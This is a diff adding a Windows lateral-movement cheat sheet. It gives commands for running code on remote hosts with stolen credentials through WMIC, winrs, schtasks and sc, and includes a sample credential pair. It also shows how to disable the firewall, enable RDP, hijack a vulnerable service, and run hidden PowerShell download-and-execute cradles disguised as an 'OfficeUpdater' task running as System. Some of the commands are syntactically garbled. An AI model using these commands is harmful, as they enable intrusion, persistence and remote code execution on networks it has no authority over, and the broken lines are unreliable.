@@ -1,0 +1,60 @@
+Windows Remote Administration
+
+
+WMIC
+	wmic /node:<targetIP> /user:<username> /password:<password> process call create "cmd.exe /c <command>" - execute command on remote host wmic /node:<targetIP> /user:<username> /password:<password> process call create "cmd.exe /c <command> >> \\YourIp\Share\output.txt" - redirect STDOUT to UNC path
+	wmic /node:10.0.1.1 /user:LANNISTER\avservice /password:RrTXshEN
+	process call create "cmd.exe /c c:\\runme.bat"
+	Executing (Win32_Process)->Create()
+	Method execution successful.
+	Out Parameters:
+	instance of __PARAMETERS
+	{
+		ProcessId = 3368; <-- This indicates Success!
+		ReturnValue = 0;
+	};
+WinRM
+	winrs /r:<hostname> /u:<user> /p:<password> <cmd>
+Task Scheduler Service
+	net time \\<host>
+	schtasks /CREATE /S \\<ip> /U <user> /P <password> /tn <taskname> /tr <cmd> /sc ONCE /st <24:00 time> /SD <DD/MM/YYYY>
+	schtasks /DELETE /tn <taskname>
+		using current creds or pth:
+	schtasks /CREATE /S \\10.0.1.2 /tn prdelka /tr "c:\windows\system32\rundll32.exe c:\exploit.dll DllMain,1" /sc ONCE /st 12:00 /SD 18/11/2015
+Download & Exec PowerShell
+	schtasks /create /tn OfficeUpdater /tr "powershell.exe -w hidden -Nonl -nop -c 'IE ((new-object
+net.webclient).downloadstring("http://server/script.ps1"'))'" /sc onlogon /ru System
+Deprecated
+	net time \\<host>
+	at \\<host> <24:00 time> /interactive "cmd"
+Service Manager
+	--Can also be used remotely with sc.exe \\<ip> <cmd> as below
+	sc queryex 
+		-list services
+	sc qc <service> 
+		-query service config (shows logged on user).
+	sc stop/start/pauce/continue <service> 
+		-stop/start/pause/continue service
+	sc control 
+		-send CONTROL B to service (use after continue)
+	sc config VulnService binpath="c:\lol.exe" 
+		-reconfigure vulnerable services
+	sc enumdepend <Service> 
+		-list service dependancies
+	sc \\<ip> create <serv> binpath=c:\blah.exe start=auto 
+		-create remote service
+General Administration
+		Disable Firewall
+	netsh firewall set opmode disable
+		Enable Terminal Services
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+	Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	net start "termservice"
+		Download & Exec
+	schtasks /create /tn OfficeUpdater /tr "powershell.exe -w hidden -Nonl -nop -c 'IE ((new-object
+net.webclient).downloadstring("http://server/script.ps1"'))'" /sc onlogon /ru System
+		Download & Exec (w/Proxy!)
+	powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo - noprofile -c $wc=New-Object
+	System.Net.WebClient;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IEX$wc.DownloadString('http://10.0.0.250/a');"
+		Download File
+	powershell -w hidden -exec bypass -nop -c "(New-Object System.Net.WebClient).downloadfile('http://www.microsoft.com/favicon.ico','output.ico')
